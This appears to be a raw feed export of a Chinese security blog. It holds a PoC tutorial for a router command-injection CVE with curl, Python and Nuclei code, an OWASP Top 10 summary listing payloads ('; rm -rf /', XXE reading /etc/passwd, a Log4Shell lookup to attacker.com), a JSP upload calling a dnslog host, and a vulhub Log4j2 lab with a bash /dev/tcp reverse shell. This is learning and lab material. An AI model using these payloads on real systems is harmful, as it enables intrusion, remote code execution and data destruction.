class="hljs-name">base64</span>(<span class="hljs-name">&#x27;id&#x27;</span>)&#125;&#125;</span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p>这行代码揭示了最关键的信息：</p><ol><li>存在一个名为 <strong><code>cmd</code></strong> 的参数。这就是我们的<strong>注入点</strong>。</li><li>传递给 <code>cmd</code> 参数的内容需要进行 <strong>Base64 编码</strong>。这是一个常见的绕过技巧。</li></ol></li><li><p><strong>选择一个无害的载荷 (Payload):</strong><br>PoC 的目的是“证明”漏洞存在，而不是破坏系统。因此，我们必须选择一个<strong>安全、无害、有明显回显</strong>的命令。</p><ul><li><strong><code>id</code> 命令：</strong> 这是最佳选择之一。在所有 Linux&#x2F;Unix 系统上都存在，执行后会返回当前用户的ID信息，如 <code>uid=0(root) gid=0(root)</code>。它的输出非常独特，易于识别。</li><li><strong><code>whoami</code> 命令：</strong> 同样优秀，返回当前用户名。</li><li><strong><code>sleep 5</code> 命令：</strong> 用于<strong>盲注</strong>。如果你无法直接看到命令的输出，可以通过判断服务器响应是否延迟了5秒来确认命令是否执行。</li></ul></li></ul><p><strong>小结：</strong> 我们的作案手法是，构造一个 POST 请求，其 body 为 <code>cmd=&lt;base64编码后的&#39;id&#39;命令&gt;</code>。</p><hr><h3 id="第三步：编写-PoC（多种形式的作案演练）"><a href="#第三步：编写-PoC（多种形式的作案演练）" class="headerlink" title="第三步：编写 PoC（多种形式的作案演练）"></a>第三步：编写 PoC（多种形式的作案演练）</h3><p>现在，我们将以上分析转化为实际可执行的代码。一个 PoC 可以有多种形式，从简单到复杂。</p><h4 id="形式一：最简单的-PoC-使用-curl"><a href="#形式一：最简单的-PoC-使用-curl" class="headerlink" title="形式一：最简单的 PoC - 使用 curl"></a>形式一：最简单的 PoC - 使用 <code>curl</code></h4><p><code>curl</code> 是网络调试的瑞士军刀，是编写 PoC 最快的方式。</p><ol><li><p><strong>准备载荷:</strong> <code>id</code> 命令的 Base64 编码是 <code>aWQ=</code>。</p><ul><li>你可以在 Linux&#x2F;Mac 上用命令 <code>echo -n &quot;id&quot; | base64</code> 来获取。</li></ul></li><li><p><strong>编写 <code>curl</code> 命令:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -X POST: 指定使用 POST 方法</span><br><span class="hljs-comment"># -H &quot;Content-Type...&quot;: 指定请求头，这在处理表单数据时通常是必需的</span><br><span class="hljs-comment"># -d &quot;cmd=aWQ=&quot;: 指定 POST 请求的 body 内容</span><br><span class="hljs-comment"># http://&lt;TARGET_IP&gt;/adm.cgi: 目标 URL</span><br><br>curl -X POST \<br>  -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> \<br>  -d <span class="hljs-string">&quot;cmd=aWQ=&quot;</span> \<br>  http://&lt;TARGET_IP&gt;/adm.cgi<br></code></pre></td></tr></table></figure></li><li><p><strong>验证结果:</strong> 如果漏洞存在，执行上述命令后，你应该能在返回的内容中看到类似 <code>uid=0(root) gid=0(root)</code> 的字符串。</p></li></ol><h4 id="形式二：更灵活的-PoC-使用-Python-脚本"><a href="#形式二：更灵活的-PoC-使用-Python-脚本" class="headerlink" title="形式二：更灵活的 PoC - 使用 Python 脚本"></a>形式二：更灵活的 PoC - 使用 Python 脚本</h4><p>Python 脚本让 PoC 更具可读性、可重用性，并且可以加入自动化验证逻辑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># ----------------- 配置 -----------------</span><br><span class="hljs-comment"># 从命令行参数获取目标IP，如果没有则提示并退出</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;用法: python poc.py &lt;目标IP地址&gt;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;例如: python poc.py 192.168.1.1&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br>target_ip = sys.argv[<span class="hljs-number">1</span>]<br>url = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;target_ip&#125;</span>/adm.cgi&quot;</span><br><br><span class="hljs-comment"># ----------------- 载荷 -----------------</span><br><span class="hljs-comment"># 我们要执行的无害命令</span><br>command = <span class="hljs-string">&quot;id&quot;</span><br><span class="hljs-comment"># 根据漏洞要求，对命令进行 Base64 编码</span><br><span class="hljs-comment"># 注意：要编码 bytes，而不是 str</span><br>encoded_command = base64.b64encode(command.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-comment"># ----------------- 构造请求 -----------------</span><br><span class="hljs-comment"># POST 请求的 body 数据</span><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: encoded_command<br>&#125;<br><span class="hljs-comment"># 请求头</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>&#125;<br><br><span class="hljs-comment"># ----------------- 发送请求并验证 -----------------</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 正在向 <span class="hljs-subst">&#123;url&#125;</span> 发送恶意请求...&quot;</span>)<br>    response = requests.post(url, data=data, headers=headers, timeout=<span class="hljs-number">10</span>)<br><br>    <span class="hljs-comment"># 验证逻辑：检查响应内容中是否包含&#x27;id&#x27;命令的特征输出</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;uid=&quot;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;gid=&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[!!!] 漏洞存在！ CVE-2022-34577&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 命令执行结果:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(response.text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] 目标似乎不受此漏洞影响。&quot;</span>)<br><br><span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[X] 请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><strong>如何运行这个Python PoC:</strong></p><ol><li>将代码保存为 <code>poc.py</code>。</li><li>安装 <code>requests</code> 库: <code>pip install requests</code>。</li><li>在命令行中运行: <code>python poc.py &lt;目标设备的IP地址&gt;</code>。</li></ol><h4 id="形式三：自动化的-PoC-Nuclei-模板（对您提供示例的解读）"><a href="#形式三：自动化的-PoC-Nuclei-模板（对您提供示例的解读）" class="headerlink" title="形式三：自动化的 PoC - Nuclei 模板（对您提供示例的解读）"></a>形式三：自动化的 PoC - Nuclei 模板（对您提供示例的解读）</h4><p>Nuclei 模板是用于大规模、自动化扫描的 PoC。它将请求和验证逻辑声明化。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># ... (info 块) ...</span><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">method:</span> <span class="hljs-string">POST</span>              <span class="hljs-comment"># 1. 使用 POST 方法</span><br>    <span class="hljs-attr">path:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/adm.cgi&quot;</span> <span class="hljs-comment"># 2. 目标路径是 /adm.cgi</span><br><br>    <span class="hljs-attr">body:</span> <span class="hljs-string">&quot;cmd=<span class="hljs-template-variable">&#123;&#123;base64(&#x27;id&#x27;)&#125;&#125;</span>&quot;</span> <span class="hljs-comment"># 3. Body是cmd=... Nuclei的&#123;&#123;base64(&#x27;id&#x27;)&#125;&#125;会自动完成编码</span><br><br>    <span class="hljs-attr">headers:</span><br>      <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/x-www-form-urlencoded</span> <span class="hljs-comment"># 请求头</span><br>      <br>    <span class="hljs-attr">matchers-condition:</span> <span class="hljs-string">and</span>    <span class="hljs-comment"># 4. 验证条件：下面的两个 matcher 必须同时满足</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;uid=&quot;</span>             <span class="hljs-comment"># 5. 第一个条件：响应内容中必须包含 &quot;uid=&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;gid=&quot;</span>             <span class="hljs-comment">#    和 &quot;gid=&quot;</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br>        <br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&lt;html&gt;&quot;</span>           <span class="hljs-comment"># 6. 第二个条件：响应内容中不能包含 &quot;&lt;html&gt;&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&lt;script&gt;&quot;</span>         <span class="hljs-comment">#    或 &quot;&lt;script&gt;&quot;</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attr">negative:</span> <span class="hljs-literal">true</span>         <span class="hljs-comment">#    negative: true 的意思是“不包含”</span><br></code></pre></td></tr></table></figure><p>这个 <code>negative: true</code> 的匹配器非常聪明，它排除了那些虽然返回错误但可能会反射我们输入内容的正常HTML页面，从而大大降低了误报率。</p><hr><h3 id="总结：编写-PoC-的核心思想"><a href="#总结：编写-PoC-的核心思想" class="headerlink" title="总结：编写 PoC 的核心思想"></a>总结：编写 PoC 的核心思想</h3><ol><li><strong>理解原理：</strong> 知道是什么漏洞类型（SQL注入、RCE、XSS等）。</li><li><strong>确定目标：</strong> 找到脆弱的 URL、参数和请求方法。</li><li><strong>选择载荷：</strong> 使用最简单、无害、有明显特征的载荷来证明漏洞。</li><li><strong>构建请求：</strong> 使用 <code>curl</code>、Python 或其他工具发送构造好的请求。</li><li><strong>验证结果：</strong> 检查响应中是否包含你预期的特征（如<code>uid=</code>、特定的延迟、弹窗等）。</li></ol><p>希望这个从分析到实践的完整流程能帮助您掌握如何编写 PoC！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>OWASP漏洞</title>
    <link href="/2025/03/23/OWASP%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/03/23/OWASP%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="owasp十大漏洞知识点"><a href="#owasp十大漏洞知识点" class="headerlink" title="owasp十大漏洞知识点"></a>owasp十大漏洞知识点</h1><hr><h3 id="1-注入（Injection）"><a href="#1-注入（Injection）" class="headerlink" title="1. 注入（Injection）"></a>1. <strong>注入（Injection）</strong></h3><ul><li><strong>原理</strong>：攻击者将恶意数据（如SQL、OS命令、NoQL）插入解释器中，欺骗解释器执行非预期命令。</li><li><strong>利用方式</strong>：<ul><li><strong>SQL注入</strong>：<code>&#39; OR &#39;1&#39;=&#39;1</code> 绕过登录；<code>UNION SELECT</code> 窃取数据。</li><li><strong>命令注入</strong>：<code>; rm -rf /</code> 在参数中拼接系统命令。</li><li><strong>NoSQL注入</strong>：<code>&#123;&quot;$ne&quot;: &quot;1&quot;&#125;</code> 绕过MongoDB查询。</li></ul></li><li><strong>防御</strong>：参数化查询（Prepared Statements）、输入验证、ORM框架、最小权限原则。</li></ul><hr><h3 id="2-失效的身份认证（Broken-Authentication）"><a href="#2-失效的身份认证（Broken-Authentication）" class="headerlink" title="2. 失效的身份认证（Broken Authentication）"></a>2. <strong>失效的身份认证（Broken Authentication）</strong></h3><ul><li><strong>原理</strong>：身份验证或会话管理机制存在缺陷，导致账户被接管。</li><li><strong>利用方式</strong>：<ul><li>暴力破解弱密码（如<code>admin/password</code>）。</li><li>窃取Session ID（XSS、网络嗅探）。</li><li>滥用密码重置逻辑（如未验证邮箱所有权）。</li></ul></li><li><strong>防御</strong>：多因素认证（MFA）、强密码策略、安全存储Session、HTTPS加密。</li></ul><hr><h3 id="3-敏感数据泄露（Sensitive-Data-Exposure）"><a href="#3-敏感数据泄露（Sensitive-Data-Exposure）" class="headerlink" title="3. 敏感数据泄露（Sensitive Data Exposure）"></a>3. <strong>敏感数据泄露（Sensitive Data Exposure）</strong></h3><ul><li><strong>原理</strong>：未加密或弱加密保护敏感数据（密码、信用卡号）。</li><li><strong>利用方式</strong>：<ul><li>窃取未加密的传输数据（中间人攻击）。</li><li>获取备份数据库（如AWS S3公开访问）。</li></ul></li><li><strong>防御</strong>：TLS加密传输、静态数据加密（AES-256）、禁用缓存敏感数据、密钥管理。</li></ul><hr><h3 id="4-XML外部实体（XXE）"><a href="#4-XML外部实体（XXE）" class="headerlink" title="4. XML外部实体（XXE）"></a>4. <strong>XML外部实体（XXE）</strong></h3><ul><li><strong>原理</strong>：解析恶意XML时，引用外部实体导致文件读取&#x2F;SSRF。</li><li><strong>利用方式</strong>：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>读取服务器文件或发起内网请求。</li><li><strong>防御</strong>：禁用DTD&#x2F;外部实体（如<code>libxml_disable_entity_loader</code>）、使用JSON替代XML。</li></ul><hr><h3 id="5-失效的访问控制（Broken-Access-Control）"><a href="#5-失效的访问控制（Broken-Access-Control）" class="headerlink" title="5. 失效的访问控制（Broken Access Control）"></a>5. <strong>失效的访问控制（Broken Access Control）</strong></h3><ul><li><strong>原理</strong>：未对用户权限进行校验，允许越权操作。</li><li><strong>利用方式</strong>：<ul><li>修改URL参数（如<code>/user?id=123</code> → <code>id=124</code>）访问他人数据。</li><li>未授权访问管理接口（如<code>/admin</code> 无鉴权）。</li></ul></li><li><strong>防御</strong>：RBAC权限模型、服务端校验所有权、默认拒绝原则。</li></ul><hr><h3 id="6-安全配置错误（Security-Misconfiguration）"><a href="#6-安全配置错误（Security-Misconfiguration）" class="headerlink" title="6. 安全配置错误（Security Misconfiguration）"></a>6. <strong>安全配置错误（Security Misconfiguration）</strong></h3><ul><li><strong>原理</strong>：默认配置、冗余功能、错误HTTP头导致暴露漏洞。</li><li><strong>利用方式</strong>：<ul><li>访问未删除的调试页面（如<code>/phpinfo.php</code>）。</li><li>利用默认密码登录（Tomcat <code>admin:admin</code>）。</li></ul></li><li><strong>防御</strong>：最小化安装、定期扫描配置、自动化部署（如Ansible）、禁用目录列表。</li></ul><hr><h3 id="7-跨站脚本（XSS）"><a href="#7-跨站脚本（XSS）" class="headerlink" title="7. 跨站脚本（XSS）"></a>7. <strong>跨站脚本（XSS）</strong></h3><ul><li><strong>原理</strong>：恶意脚本注入到网页中，在用户浏览器执行。</li><li><strong>类型与利用</strong>：<ul><li><strong>反射型XSS</strong>：通过钓鱼链接传播（<code>http://site.com?search=&lt;script&gt;alert(1)&lt;/script&gt;</code>）。</li><li><strong>存储型XSS</strong>：恶意评论存入数据库，所有用户加载时触发。</li><li><strong>DOM型XSS</strong>：前端JS操作DOM时未转义（如<code>document.write(location.hash)</code>）。</li></ul></li><li><strong>防御</strong>：输出编码（HTML&#x2F;JS&#x2F;CSS）、CSP策略、输入验证、<code>HttpOnly</code> Cookie。</li></ul><hr><h3 id="8-不安全的反序列化（Insecure-Deserialization）"><a href="#8-不安全的反序列化（Insecure-Deserialization）" class="headerlink" title="8. 不安全的反序列化（Insecure Deserialization）"></a>8. <strong>不安全的反序列化（Insecure Deserialization）</strong></h3><ul><li><strong>原理</strong>：反序列化恶意数据导致远程代码执行（RCE）或权限提升。</li><li><strong>利用方式</strong>：<ul><li>Java反序列化漏洞（如Apache Commons Collections）。</li><li>篡改Cookie中的序列化对象提升权限。</li></ul></li><li><strong>防御</strong>：避免反序列化用户输入、使用JSON、签名验证数据完整性。</li></ul><hr><h3 id="9-使用含已知漏洞的组件（Vulnerable-Components）"><a href="#9-使用含已知漏洞的组件（Vulnerable-Components）" class="headerlink" title="9. 使用含已知漏洞的组件（Vulnerable Components）"></a>9. <strong>使用含已知漏洞的组件（Vulnerable Components）</strong></h3><ul><li><strong>原理</strong>：第三方库（如Log4j、Struts）存在公开漏洞。</li><li><strong>利用方式</strong>：<ul><li>CVE-2021-44228（Log4Shell）：<code>$&#123;jndi:ldap://attacker.com/exp&#125;</code> 触发RCE。</li></ul></li><li><strong>防御</strong>：依赖扫描工具（OWASP Dependency-Check）、定期更新、移除无用依赖。</li></ul><hr><h3 id="10-日志与监控不足（Insufficient-Logging-Monitoring）"><a href="#10-日志与监控不足（Insufficient-Logging-Monitoring）" class="headerlink" title="10. 日志与监控不足（Insufficient Logging &amp; Monitoring）"></a>10. <strong>日志与监控不足（Insufficient Logging &amp; Monitoring）</strong></h3><ul><li><strong>原理</strong>：未记录关键事件（登录失败、异常请求），导致攻击无法追溯。</li><li><strong>利用方式</strong>：攻击者横向移动而不触发告警（如数据窃取数月未被发现）。</li><li><strong>防御</strong>：集中化日志（ELK&#x2F;Splunk）、实时监控、设置告警阈值（如5分钟内20次登录失败）。</li></ul><hr><h3 id="关键防御策略"><a href="#关键防御策略" class="headerlink" title="关键防御策略"></a>关键防御策略</h3><ol><li><strong>纵深防御</strong>：多层安全措施（WAF+输入校验+编码+最小权限）。</li><li><strong>自动化工具</strong>：SAST&#x2F;DAST扫描（如ZAP、Burp Suite）、依赖检查。</li><li><strong>安全意识</strong>：开发人员安全培训（如安全编码规范）。</li><li><strong>威胁建模</strong>：设计阶段识别潜在风险（如STRIDE模型）。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ueditor</title>
    <link href="/2025/03/21/ueditor/"/>
    <url>/2025/03/21/ueditor/</url>
    
    <content type="html"><![CDATA[<p>搭建临时网站f7msgp.dnslog.cn</p><h4 id="上传恶意-JSP-文件"><a href="#上传恶意-JSP-文件" class="headerlink" title="上传恶意 JSP 文件"></a><strong>上传恶意 JSP 文件</strong></h4><p><strong>上传接口</strong>：<code>/ueditor/jsp/controller.jsp?action=uploadfile</code></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dart">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.net.URL&quot;</span> %&gt;<br>&lt;%<br>  <span class="hljs-built_in">String</span> dnsDomain = <span class="hljs-string">&quot;abc123.dnslog.cn&quot;</span>;  <span class="hljs-comment">// 替换为你的DNSLog域名</span><br>  <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// 触发DNS解析请求</span><br>      <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://&quot;</span> + dnsDomain).openConnection().connect();<br>      out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;DNSLog Triggered&quot;</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>      out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: &quot;</span> + e.getMessage());<br>  &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>抓post包</p><p><img src="/../images/image-20250723153529454.png" alt="image-20250723153529454"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Log4j2的JNDI注入漏洞复现</title>
    <link href="/2025/03/15/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/15/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Log4j2的JNDI注入漏洞复现"><a href="#Log4j2的JNDI注入漏洞复现" class="headerlink" title="Log4j2的JNDI注入漏洞复现"></a>Log4j2的JNDI注入漏洞复现</h1><p>参考文章：</p><p><a href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p><p><a href="https://www.cnblogs.com/0dot7/p/17259327.html">https://www.cnblogs.com/0dot7/p/17259327.html</a></p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="关于Log4j2"><a href="#关于Log4j2" class="headerlink" title="关于Log4j2"></a>关于Log4j2</h3><p>Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件，但是因为存在前身Log4j，而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似</p><h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p>Log4j2的Lookup允许在日志配置和日志消息中动态插入变量值，这些变量可以是外部环境变量，也可以是MDC中的变量，还可以是日志上下文数据等。</p><p>格式类似”${type:var}”，即可以实现对变量var的引用。type可以是如下值：</p><ol><li>ctx：允许程序将数据存储在 Log4j <code>ThreadContext</code>Map 中，然后在日志输出过程中，查找其中的值。</li><li>env：允许系统在全局文件（如 &#x2F;etc&#x2F;profile）或应用程序的启动脚本中配置环境变量，然后在日志输出过程中，查找这些变量。例如：<code>$&#123;env:USER&#125;</code>。</li><li>java：允许查找Java环境配置信息。例如：<code>$&#123;java:version&#125;</code>。</li><li>jndi：允许通过 JNDI 检索变量。</li><li>…</li></ol><p>这次漏洞就跟jndi有关，我们接下来了解一下jndi注入的漏洞成因</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>JNDI（Java Naming and Directory  Interface，Java命名和目录接口），是Java提供的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 。</p><p>JNDI还支持从指定的远程服务器上下载class文件，加载到本地JVM中，并通过适当的方式创建对象。这里就是漏洞的主要来源</p><p>由于Log4j 的 JNDI 支持并没有限制可以解析的名称。一些协议像rmi:和ldap:是不安全的或者可以允许远程代码执行。攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p><p><strong><code>rmi:</code> 协议</strong></p><ul><li><strong>RMI（Remote Method Invocation）</strong> 是 Java 提供的远程方法调用机制，允许一个 Java 虚拟机（JVM）调用另一个 JVM 上的对象方法。</li><li>在 Log4j2 漏洞中，攻击者可以通过 <code>rmi:</code> 协议指向一个恶意的 RMI 服务器，从而触发远程代码执行。</li></ul><p><strong><code>ldap:</code> 协议</strong></p><ul><li><strong>LDAP（Lightweight Directory Access Protocol）</strong> 是一种用于访问目录服务的协议，常用于企业中的身份验证和资源管理。</li><li>在 Log4j2 漏洞中，攻击者可以通过 <code>ldap:</code> 协议指向一个恶意的 LDAP 服务器，返回一个恶意类或序列化对象，从而触发远程代码执行。</li></ul><p>我们举个例子</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/127.0.0.1/shell</span>&#125;<br></code></pre></td></tr></table></figure><p>当我们传入这个字符串的时候，log4j2组件就会将信息记录到日志中，并且log4j2会尝试解析这些信息，通过jndi的lookup()方法去解析该URL：ldap:&#x2F;&#x2F;127.0.0.1&#x2F;shell，由于是ldap协议，所以就会去该地址下的ldap服务中寻找名为shell的资源，找到后将资源信息返回给组件，之后log4j2组件就会下载下来，假如我们的shell文件的一个恶意的.class文件，那就会执行里面的代码，从而造成注入</p><h2 id="环境搭建-漏洞复现"><a href="#环境搭建-漏洞复现" class="headerlink" title="环境搭建&amp;漏洞复现"></a>环境搭建&amp;漏洞复现</h2><p>vulhub靶场有现成的环境</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> vulhub/log4j/CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">44228</span>/<br><span class="hljs-attribute">docker</span>-compose up -d<br></code></pre></td></tr></table></figure><p>使用vulhub靶场，启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1</p><p>起环境后访问8983端口</p><p><img src="/%5Cimages%5CLog4j2-1.png"></p><p>然后我们对网站进行测试，用一个dns服务器起一个域名，这里我用yakit的dns服务器</p><p><img src="/%5Cimages%5CLog4j2-2.png"></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>&#123;jndi:ldap:<span class="hljs-comment">//wsythhvyqt.dgrh3.cn&#125;</span><br></code></pre></td></tr></table></figure><p>利用JNDI发送DNS请求的Payload，并且在dns服务器上成功收到回显</p><p>然后就是漏洞利用了</p><p>使用JNDI注入工具</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">工具地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/welk1n/</span>JNDI-Injection-Exploit<br></code></pre></td></tr></table></figure><p>然后我们构造反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/vps.ip/port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后用工具进行注入</p><p><img src="/%5Cimages%5CLog4j2-3.png"></p><p>我这里版本是jdk1.8的，所以直接传就行，然后监听端口就可以收到了</p><p><img src="/%5Cimages%5CLog4j2-4.png"></p><p>到此靶场的复现就完成了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA</title>
    <link href="/2025/03/14/JAVA/"/>
    <url>/2025/03/14/JAVA/</url>
    
